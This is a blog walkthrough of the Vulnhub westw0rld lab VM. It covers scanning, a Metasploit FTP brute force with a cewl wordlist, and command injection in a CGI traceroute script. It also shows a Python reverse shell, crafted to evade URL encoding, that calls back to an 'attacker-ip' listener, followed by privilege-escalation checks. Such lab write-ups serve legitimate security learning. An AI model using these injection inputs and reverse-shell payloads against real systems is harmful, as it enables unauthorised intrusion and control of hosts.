---
layout: post
title:  "Vulnhub westw0rld Walkthrough"
date:   2019-08-25
categories: vulnhub westw0rld westworld walkthrough
---
# Vulnhub westw0rld Walkthrough

I have never seen this show.

Now that we have that out of the way, let's explore the westw0rld VM available on [Vulnhub][vulnhub]. This is the description by the author:

> This is a vulnerable lab challenge for the starters. If you are a big fan of westworld, you might be familiar with the flags. To complete this challenge, you need to achieve ten flags which contains some useful clues. The ultimate goal is to find and read the flag in the windows machine. You will require Linux skills and basic knowledge about web vulnerabilities, reverse engineering and password cracking.
>
> This lab contains two vulnerable machines: Ubuntu 18.04.2 & Windows XP Professional. The OVAs have been tested on VMware Workstation and VMware Fusion.
>
> Hint: You should start the challenge from the Ubuntu machine. Enjoy your hacking :)

As far as I can tell, there is no Windows box available. Because of this, it seems like it is impossible to get the root flag as the author intended. I reached out to the author in email, but have yet to get a response. Regardless, we can still have some fun and retrieve 9 of the 10 flags.

First, we can use `netdiscover` to find the IP. Once found, we can run nmap to scan:
{% highlight bash %}
$ nmap -A -T4 192.168.56.105
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title:     &#039;Westworld&#039; narrative loop chart shows Dolores&#...
{% endhighlight %}

We have two services to look into. Starting with :80, we can run `nikto` and `dirb` to see if we have any interesting files. `nikto` finds nothing interesting and the results from `dirb` are pretty barebone:
{% highlight bash %}
---- Scanning URL: http://192.168.56.105/ ----
+ http://192.168.56.105/admin.php (CODE:200|SIZE:295)
+ http://192.168.56.105/cgi-bin/ (CODE:403|SIZE:297)
+ http://192.168.56.105/index.html (CODE:200|SIZE:143498)
+ http://192.168.56.105/server-status (CODE:403|SIZE:302) 
{% endhighlight %}

Viewing the page in a browser, we have a long page that looks copied from a blog. In the middle, however, we have a flag and a hint:
> Dolores is a user and passwd is in this page. Use some tools to generate passwd maybe.

This could be referring to either the `ftp` or the `admin.php` page. Visiting `admin.php`, we retrieve another flag in the comments. However, before we start wasting time breaking the page, we should enumerate more on the `ftp`. 

By connecting, we retrieve another flag:
{% highlight bash %}
$ ftp 192.168.56.105
Connected to 192.168.56.105.
220-<--flag: All my life, I've prided myself on being a survivor. But surviving is just another loop.-->
220 
{% endhighlight %}

Since we are connected, we can test an anonymous login and see that it is not enabled:
{% highlight bash %}
Name (192.168.56.105): anonymous
500 OOPS: vsftpd: refusing to run with writable root inside chroot()
{% endhighlight %}

It seems that either route we will need a wordlist. We can use `cewl` to generate one from the page, as per the hint:
{% highlight bash %}
$ cewl.rb -d 1 192.168.56.105 > wordlist.txt
{% endhighlight %}

We can start easy and use metasploit to brute force the ftp login:
{% highlight bash %}
msf5 > use auxiliary/scanner/ftp/ftp_login 

msf5 auxiliary(scanner/ftp/ftp_login) > set rhosts 192.168.56.105
RHOSTS => 192.168.56.105
msf5 auxiliary(scanner/ftp/ftp_login) > set USERNAME Dolores
USERNAME => Dolores
msf5 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE wordlist.txt
PASS_FILE => wordlist.txt
msf5 auxiliary(scanner/ftp/ftp_login) > run

[+] 192.168.56.105:21     - 192.168.56.105:21 - Login Successful: Dolores:loop
{% endhighlight %}

With the password, we can ftp in and view the directory:
{% highlight bash %}
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-x---    2 1002     1002         4096 Apr 16 17:28 .
dr-xr-x---    2 1002     1002         4096 Apr 16 17:28 ..
-rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
-rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
-rw-r--r--    1 1002     1002         8980 Apr 16  2018 examples.desktop
-rw-r--r--    1 1000     1000        51862 Apr 16 17:18 flag.pdf
-rwxr-xr-x    1 0        0            8560 Apr 15 19:01 hackme.o
226 Directory send OK.
{% endhighlight %}

After downloading and looking through everything, the only interesting files are `flag.pdf` and `hackme.o`. The pdf has another flag (but it's identically to the last one?) along with a hint: `Hint:/cgi-bin/lawrence` The file asks for input and a quick examination of the strings looks like it outputs a flag. Let's pursue the web route first.

In addition to a flag, `cgi-bin/lawrence` has a form that posts to a 404. Viewing the request in burp, we can see it posts to `/cgi-bin/trace.cgi`. By fixing the request path, we can see the command returns the result of `traceroute`:
{% highlight html %}
GET /cgi-bin/lawrence/trace.cgi?ip=127.0.0.1
<pre>
traceroute to 127.0.0.1 (127.0.0.1), 30 hops max, 60 byte packets
 1  localhost (127.0.0.1)  0.035 ms  0.012 ms  0.005 ms
</pre>
{% endhighlight %}

I bet this is vulnerable to command-injection:
{% highlight html %}
GET /cgi-bin/lawrence/trace.cgi?ip=;ls
<pre>
HINT
example.sh
lawrence
</pre>
{% endhighlight %}

The hint gives us our next objective:
{% highlight html %}
GET /cgi-bin/lawrence/trace.cgi?ip=;cat%20HINT
<pre>
The final flag is a file on root's desktop. Get it through the webshell.</pre>
</pre>
{% endhighlight %}

Exploring the machine, we can see it has `netcat`, `python3`, and `perl` installed. We can start a listener on our box:
{% highlight bash %}
$ ncat -lvp 1234
{% endhighlight %} 

However, we have to deal with our command being URL-encoded, so we have to avoid `&?=` among others. Perl reverse shells require the use of `&`, so that's out. `netcat` will establish a connection with our listener but then die. The `python` reverse shell uses `=` as well, but it can be replaced with `globals().__setitem` to bypass the encoded. I chose to store the shell under `tmp` so I could easily access it again if my connection died:
{% highlight html %}
GET /cgi-bin/lawrence/trace.cgi?ip=;echo%20'import%20socket,subprocess,os;%20globals().__setitem__("s",socket.socket(socket.AF_INET,socket.SOCK_STREAM));s.connect(("attacker-ip",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'>/tmp/p.py HTTP/1.1
{% endhighlight %} 

With the shell stored, we can then execute it:
{% highlight html %}
GET /cgi-bin/lawrence/trace.cgi?ip=;python3%20/tmp/p.py HTTP/1.1
{% endhighlight %}

With a shell, we can spawn a bash sessions and switch over to Dolores:
{% highlight bash %}
www-data@ubuntu:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash");'
<in$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@ubuntu:/usr/lib/cgi-bin$ su Dolores
su Dolores
Password: loop
$
{% endhighlight %}

On a whim, let's search for any low-hanging fruit:
{% highlight bash %}
$ find / -name "flag" 2>/dev/null
find / -name "flag" 2>/dev/null
/home/Arnold/flag
/srv/ftp/flag
{% endhighlight %}

Before we go to much further, we should go back and examine `hackme.o`. Viewing the strings, we have some suspicious entries:
{% highlight bash %}
 strings hackme.o
%$       
%"       
<--flag:H
<--flag:H
 Oh? youH
 useH
<--flag:H
 Death oH
r suH
<--flag:H
 This isH
 notH
<--flag:H
 You areH
 cloH
Dreams dH
on't meaH
n anythiH
ng, theyH
 are jusH
t noise,H
 they arH
e not reH
al.-->
Felix LuH
AWAVI
AUATL
[]A\A]A^A_
It seems you have made some progress, be aware of what you type in this console. Robots may awake!
Watch, watch me pushing my dagger into your heart. Death is inevitable!--Maeve
{% endhighlight %}

There are two approaches we can take here. One is to reverse the application, find the appropriate `jne` instruction and change it to accept any input. Far easier is to look at the strings and see one that isn't displayed: "Felix Lu". Googling "Felix Lu westworld" reveals a character called "Felix Lutz":
{% highlight bash %}
/hackme.o
It seems you have made some progress, be aware of what you type in this console. Robots may awake!
Felix Lutz
<--flag:Dreams don't mean anything, they are just noise, they are not real.-->
{% endhighlight %} 

By now we have 9 flags, one of which repeats, and one that doesn't have the `<--flag` format:
{% highlight html %}
<--flag: This world is just a speck of duct sitting on a much, much bigger world.-->
<!--flag: If you can't tell the difference, does it matter if I'm real or not?--> 
<--flag: All my life, I've prided myself on being a survivor. But surviving is just another loop.-->
<--flag: All my life, I’ve prided myself on being a survivor. But surviving is just another loop.-->
<--flag You can't play god without being acquainted with the devil.-->
<--flag: I'm afraid in order to escape this place, you will need to suffer more.-->
<--flag: The piano doesn’t murder the player if it doesn’t like the music.-->
OK you find me
<--flag:Dreams don't mean anything, they are just noise, they are not real.-->
{% endhighlight %}

So here we come to the sticking point. We need a way to escalate our privileges to root. We also still have yet to do any password cracking. I want to believe that the root's password is stored on the Windows VM in some sort of weak password store that we were supposed to crack. Since that option is obviously not available, I went through the standard checklist of privilege escalation tricks. This system is relatively updated, so classic techniques like dirtyc0w won't work.

1. Kernel Exploit - None available
2. SUID/SGID - None outside of standard system processes (ping/su/etc.)
3. Sudo - Not available for Dolores
4. Cronjobs - Nothing of interest except logrotate
	- This is not vulnerable to the [logrotate privilege escalation][logrotate] for a variety of reasons. For one, /var/www is write-protected by root. For two, php is not installed on the server. It seems like `admin.php` was a decoy.
5. Environment Vars - Nothing of interest
6. Buffer overflow - hackme.o is not setuid, so even if we could cause an overflow, we wouldn't gain anything. Also, it has a variety of stack protection in place.
7. Configuration - Dolores has write access to `/srv/ftp`, `/dev/`, `/proc/`, and `/etc/mtab/`. It might be possible to cause a race condition by writing to one of them. I investigated this with `fusermount` since it is SUID, but found no avenues that would work.
8. Weak passwords - I tried some weak passwords like "toor", "password", etc. with no success.
	- At least for root. Arnold's password is dlonra. He has the same rights as Dolores sadly.
9. Arnold's account - Interestingly, you can log into the VM via his account in graphical mode.
	- He has a `.mozilla` folder, but this is the default install, so there isn't anything interesting stored in passwords/history/etc.    
10. Snap Modules - It isn't vulnerable to dirty-sock.
11. vmware-user-suid-wrapper - Patched and not vulnerable.

Curious, I admitted defeat and opened the ova directly. There is indeed a flag in the `root` directory. There is also 0 evidence of any Windows ova, virtual or otherwise. The vmx configuration files only have 1 machine configured. I would like to believe my theory that the Windows machine contains the necessary piece. I also ran `john` on the /etc/shadow folder to see if root's password was something basic on a wordlist and got no results. 

A disappointing end, but at least there was some fun along the way.

[vulnhub]: https://www.vulnhub.com/entry/westw0rld-1,309i/
[logrotate]: https://www.exploit-db.com/exploits/46676
